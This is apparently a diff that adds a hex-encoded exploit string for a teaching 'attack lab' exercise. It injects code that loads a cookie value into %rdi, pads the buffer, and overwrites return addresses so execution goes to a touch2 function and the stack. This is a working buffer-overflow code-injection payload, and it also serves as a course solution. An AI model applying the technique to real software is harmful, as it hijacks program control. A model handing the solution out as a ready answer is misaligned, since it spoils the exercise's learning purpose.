@@ -1,0 +1,8 @@
+48 83 ec 10          	/* sub    $0x10,%rsp */
+48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */
+c3                   	/* retq    */
+61 62 63 64             /* garbage */
+61 62 63 64 65 66 67 68 /* garbage */
+69 6a 6b 6c 6d 6e 6f 70 /* garbage */
+ec 17 40 00 00 00 00 00 /* addr of touch2 */
+78 dc 61 55 00 00 00 00 /* addr of stack */
